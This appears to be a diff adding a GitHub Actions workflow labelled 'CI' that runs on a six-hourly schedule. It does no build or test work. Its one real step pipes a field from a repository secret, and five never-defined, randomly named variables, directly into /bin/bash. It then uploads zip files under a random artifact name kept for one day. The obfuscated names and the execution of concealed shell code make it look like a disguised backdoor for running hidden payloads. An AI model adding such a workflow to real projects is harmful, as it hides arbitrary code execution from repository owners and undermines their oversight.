@@ -1,0 +1,36 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          trap5: ${{ secrets.trap5 }}
+        run: |
+          printf '%s' "$trap5" | jq -r .fw76943 | /bin/bash
+          printf '%s' "$sfon599" | jq -r .r5874 | /bin/bash
+          printf '%s' "$rdj182" | jq -r .nbuqv260 | /bin/bash
+          printf '%s' "$y3955" | jq -r .ykwh65657 | /bin/bash
+          printf '%s' "$oxjzu57187" | jq -r .xj9 | /bin/bash
+          printf '%s' "$cswm0" | jq -r .l49 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: khfLw4Ps
+          path: "*.zip"
+          retention-days: 1
